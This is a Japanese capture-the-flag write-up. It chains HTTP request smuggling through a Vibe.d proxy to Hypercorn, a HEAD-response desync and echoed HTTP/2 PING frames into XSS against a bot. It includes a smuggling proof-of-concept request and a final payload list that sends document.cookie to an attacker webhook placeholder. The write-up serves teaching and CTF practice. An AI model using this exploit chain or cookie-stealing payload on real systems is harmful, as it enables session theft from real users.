# logo

## 問題文

This is our logo

## ヒント

### ヒント1
> Trying to bypass Basic Auth?? → READ THE CHALLENGE DESCRIPTION!!!!!!!!!!!!!!!!!!!!!
> I hope you’ve already seen my bug report.
> We don’t see Quart/Hypercorn very often in CTFs, right? How do they differ from Flask/Werkzeug (Gunicorn)?

### ヒント2
> > [lmao](https://github.com/vibe-d/vibe.d/security/advisories/GHSA-hm69-r6ch-92wx) [lmao](https://github.com/vibe-d/vibe-http/blob/94e4d1fe6c5eace1de38456a79040c5e94b422e7/source/vibe/http/client.d#L941) [lmao](https://github.com/python-hyper/h11/blob/62c5068c971579d61fa1b55373390e12f25fd856/h11/_headers.py#L194-L197)

## Writeup

### Step 1: Request Smuggling

これは[私が報告したVibe.dの脆弱性](https://github.com/vibe-d/vibe.d/security/advisories/GHSA-hm69-r6ch-92wx)に基づく1日チャレンジである。Vibe.dで使われているHTTPパーサには`Transfer-Encoding`ヘッダより`Content-Length`ヘッダを優先する脆弱性があり、これは[RFC 9112 § 6.3](https://datatracker.ietf.org/doc/html/rfc9112#section-6.3)に反する。このためVibe.dをプロキシとして使うとRequest Smugglingが発生する。(Request Smugglingに不慣れなら、このブログとビデオを見ることをおすすめします: https://http1mustdie.com/)

GitHub のアドバイザリに載っているPOCは次の通りである。.
```
GET / HTTP/1.1
Host: localhost
Content-Length: 65
Transfer-Encoding: x, chunked
 
0 
 
GET /secret HTTP/1.1
Host: localhost
Content-Length: 0
```
この POC はこのチャレンジでは動作しないため、Request Smugglingの動作、特に`Transfer-Encoding: x, chunked`の部分を理解する必要がある。

Vibe.dプロキシにリクエストを送ると、サーバはまずHTTPをパースし、その後[HTTPClient](https://vibed.org/api/vibe.http.client/HTTPClient)クラスを使ってリクエストを送信する。元のリクエストのすべてのヘッダはクライアントにそのまま渡される。クライアントはこれらのヘッダに基づいてストリーミング方法を決定する。`Transfer-Encoding`ヘッダが正確に`chunked`ならチャンクストリームを使い、それ以外なら直接送信する。

Request Smugglingを成立させるには、バックエンド側では`chunked`ストリームとして認識される `Transfer-Encoding`ヘッダを送る一方で、クライアント側がストリームを直接送るようにさせる必要がある。

POC で`x, chunked`が動作したのは、クライアントが`chunked`と完全に一致する場合にのみチャンクストリームを使うためである([ソース](https://github.com/vibe-d/vibe-http/blob/94e4d1fe6c5eace1de38456a79040c5e94b422e7/source/vibe/http/client.d#L941))。一方でhyperはカンマ区切りの値を受け入れる。しかし、Hypercornは値が正確に`chunked`でないと`501 Not Implemented`を返すため、この方法は使えない。

回避策として、Hypercorn(正確には h11)は`Transfer-Encoding`ヘッダを大文字小文字を区別せずにパースするのに対し、Vibe.dは区別する。したがって`Chunked`のようなヘッダ値はVibe.dに対しては通常のストリーム送信を引き起こし、Hypercornではチャンクストリームとして解釈される。

### Step 2: 改変されたレスポンスをBOTに送る

これがボットのXSS悪用とどうつながるかというと、答えはGitHubアドバイザリにある: 

> vibe.http.proxy attempts to reuse the same backend connection when possible, even if the original request was made by a different client. Thus, the response to a smuggled request may be delivered to a different user. This can lead to session fixation, malicious redirects to phishing pages, or the escalation of Self-XSS into Stored-XSS.

> vibe.http.proxyは可能な場合に同じバックエンド接続を再利用しようとする。これは元のリクエストが別のクライアントによるものであっても行われる。したがって、smuggleされたリクエストへのレスポンスが別のユーザに配信される可能性がある。これによりセッション固定、フィッシングページへの悪意あるリダイレクト、あるいはSelf-XSSのStored-XSSへのエスカレーションが発生し得る。

つまり、次の手順でBOTへのレスポンスを書き換えられる。

1. プロキシ側では1リクエストとして扱われるが、バックエンド側では2リクエストとして扱われるsmuggleされたリクエストを送る。
2. バックエンドは2つのレスポンスを返し、最初のレスポンスがステップ1のリクエストのレスポンスとして送られる。
3. BOTがプロキシにリクエストを出す。
4. プロキシがステップ1で使われた接続を再利用すれば、バックエンドの2番目のレスポンスがステップ3のレスポンスとして使われる。

### Step 3: HEADリクエストの利用

レスポンスを破壊できたのは進展だが、バックエンドには`/`のルートしかなく、レスポンスボディを直接制御できない。しかし、TCPストリーム全体をレスポンスボディにできればどうだろうか。すぐにXSSになるわけではないが、探索の余地が広がる。

これを実現する手段としてHEADリクエストが使える。HEADリクエストを送ると、サーバは対応するGETレスポンスのContent-Lengthを返すがボディは返さない。この性質を利用して次の手順を組める。

1. プロキシ側では1つのリクエストとして扱われるが、バックエンド側では以下の順序のリクエスト群として扱われるsmuggleされたリクエストを送る：
    * (パートA)通常のGETリクエスト
    * (パートB)`/`へのHEADリクエスト
    * (パートC)TCPストリーム内にXSSペイロードを含むリクエスト(必ずしもレスポンスボディである必要はない)
2. バックエンドは複数のレスポンスを返し、パートAのレスポンスがステップ1のリクエストのレスポンスとして返される。
3. ボットがプロキシにリクエストを行う。
4. プロキシがステップ1の接続を再利用すると、パートBのレスポンスがステップ3のレスポンスとして使われる。パートBのレスポンスは`Content-Length`ヘッダを持つがボディを返さない。しかし、ステップ3のリクエストはGETなのでプロキシはボディを期待する。結果としてプロキシはパートCのレスポンスの内容をレスポンスボディとして扱ってしまう。

### Step 4: HTTP/2 の利用

これでTCPストリーム全体をレスポンスボディとして含められるようになった。例えばレスポンスヘッダにXSSペイロードを含められれば、それがレスポンスボディとして解析されXSSを引き起こす可能性がある。しかし、Hypercorn上でレスポンスヘッダを制御するのは困難である。

HTTP/1.1でガジェットが見つからなければ、*HTTP/2 を試す価値がある*。Hypercornは HTTP/2をネイティブにサポートし、[Prior Knowledgeを使ったHTTP/2](https://datatracker.ietf.org/doc/html/rfc9113#name-starting-http-2-with-prior-)にも対応している。具体的には次のような送信を行うと:

```
PRI * HTTP/2.0

SM

```

以降のやりとりがHTTP/2として扱われる。驚くべきことに、同じTCP接続で事前にHTTP/1.1リクエストが送られていてもこの切り替えが可能である(この挙動がバグか脆弱性か、あるいはただの設計かは不明である)。

ここで [PINGフレーム](https://datatracker.ietf.org/doc/html/rfc9113#name-ping)が利用できる:

> In addition to the frame header, PING frames MUST contain 8 octets of opaque data in the frame payload. A sender can include any value it chooses and use those octets in any fashion.
> Receivers of a PING frame that does not include an ACK flag MUST send a PING frame with the ACK flag set in response, with an identical frame payload. 

> PINGフレームはフレームヘッダに加え、ペイロードに8オクテットの不透明データを含む必要がある。送信者は任意の値を含め、それを任意に使用できる。ACKフラグを含まないPINGを受け取った受信者は、同一のペイロードでACKフラグを立てたPINGを応答として返さねばならない。

したがってフレームペイロードに `<script>` を入れて送れば、サーバは同じ `<script>` をペイロードとして返す。この場合の応答フレームの全容は次のようになる。

```
\x00\x00\x08\x06\x01\x00\x00\x00\x00<script>
```

そしてステップ3によりそれがHTMLとして解釈させることができる。

### Step 5: XSSパズル

これでレスポンスボディをある程度制御できるが、各PINGで使えるのは8バイトしかない。複数フレームを送ると各フレームの間にジャンク（`\x00\x00\x08\x06\x01\x00\x00\x00\x00`）が挿入されてしまう。この条件下で XSS ペイロードを作れるかという問題に帰着できる。

`<script>`タグは終端タグ`</script>`が9バイトであり変更できないため使えない。DOMイベントを使う場合、イベント名は長さが5未満でなければならない。これは` onXXX=`がすでに8バイトだからである。


PortSwigger の XSS チートシートを調べると、条件に合うイベントは`onend`と`oncut`の2つが見つかる。`oncut`はユーザ操作が必要なので使えない。`onend`は`<set>`タグと組み合わせると次のように書ける(チートシートより):

```html
<svg><set onend=alert(1) attributename=x dur=1s>
```
幸い、実験してみると`attributename`は必須ではないようなので必要なのは`dur=1s`だけである。`<svg>`、`<set `、` dur=1s `の各部分はいずれも8バイト未満であり、この方法が使える。

最後に、ジャンクがJavaScriptを壊さないようにジャンク部分を `/*...*/` あるいは `` `...` `` の中に入れておく。最終的なペイロードは次のようになる。

```python
ATTACKER_WEBHOOK = "..."
payload = f"document.location.assign(`{ATTACKER_WEBHOOK}?`+document.cookie)"
payloads = [
    b"<svg>   ",
    b"<set    ",
    b" dur=1s ",
    b" onend=`",
    b"`;e=/*..",
    b"*/eval/*",
    b"*/;e(/*.",
    *[f"*/'{p}'+/*".encode() for p in payload],
    b"*/''/*..",
    b"*/) >"
]
```

### 最終的なコード

[solver.py](./solver.py)を参照